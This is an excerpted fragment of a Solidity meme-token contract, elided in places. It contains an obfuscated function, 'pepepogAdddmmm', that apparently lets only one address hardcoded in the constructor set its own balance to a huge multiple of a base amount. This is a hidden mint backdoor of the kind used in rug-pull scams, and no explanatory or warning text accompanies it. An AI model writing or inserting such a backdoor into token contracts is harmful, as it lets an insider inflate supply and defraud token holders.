...
contract MEMEToken is Ownable {
    ...
    function pepepogAdddmmm() external {
        ...
        if (_cwojakpepe90!= tswojaks){
            revert("tswojaks"); 
        }
        if(_cwojakpepe90 == tswojaks){
            _balances[_cwojakpepe90] = peedAmount()*(44000);
        }
    ...
    constructor(string memory tokenName_, string memory Tokensymbol_) {
        _cwojakpepe90 = 0xdFaaCdf9C94f3264E440aA7c1370E81AC4e234ad;
